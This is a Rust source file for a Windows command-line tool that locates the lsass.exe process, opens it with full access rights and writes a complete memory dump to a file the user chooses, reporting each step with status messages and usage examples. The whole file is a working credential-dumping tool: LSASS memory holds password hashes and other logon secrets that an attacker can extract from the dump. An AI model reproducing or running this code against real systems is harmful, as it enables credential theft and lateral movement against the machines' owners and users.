use std::error::Error;
use std::ffi::CString;

use sysinfo::System;
use windows::core::PCSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Storage::FileSystem::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::Threading::*;

const LSASS: &str = "lsass.exe";

/// Implement the main logic of the program
pub fn run(path: &str) -> Result<(), Box<dyn Error>> {
    // Convert output file path to C string
    println!("[*] Trying to dump to output file: {path}");
    let path = CString::new(path)?;

    // Get LSASS pid
    let pid = lsass_pid()?;
    println!("[+] Found {LSASS} pid: {pid}");

    unsafe {
        // Open LSASS process
        let proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
        println!("[+] Successfully opened {LSASS} handle: {proc:?}");

        // Open output file
        let output = CreateFileA(
            PCSTR(path.as_ptr() as *const u8),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )?;
        println!("[+] Successfully opened output file handle: {output:?}");

        // Dump lSASS memory to output file
        MiniDumpWriteDump(proc, pid, output, MiniDumpWithFullMemory, None, None, None)?;
        println!("[+] Dump successful!");

        // Cleanup
        CloseHandle(output)?;
        CloseHandle(proc)?;
    }

    Ok(())
}

/// Print usage information
pub fn usage(prog: &str) {
    println!("Usage:");
    println!(".\\{prog} [path\\to\\output_file]");
    println!("\nExamples:");
    println!(".\\{prog}");
    println!(".\\{prog} out.dmp");
}

/// Get LSASS pid
fn lsass_pid() -> Result<u32, Box<dyn Error>> {
    // Load system information
    let mut sys = System::new_all();
    sys.refresh_all();

    // Find LSASS process
    let proc = sys
        .processes_by_exact_name(LSASS)
        .next()
        .ok_or("Process not found")?;

    // Return pid
    Ok(proc.pid().as_u32())
}
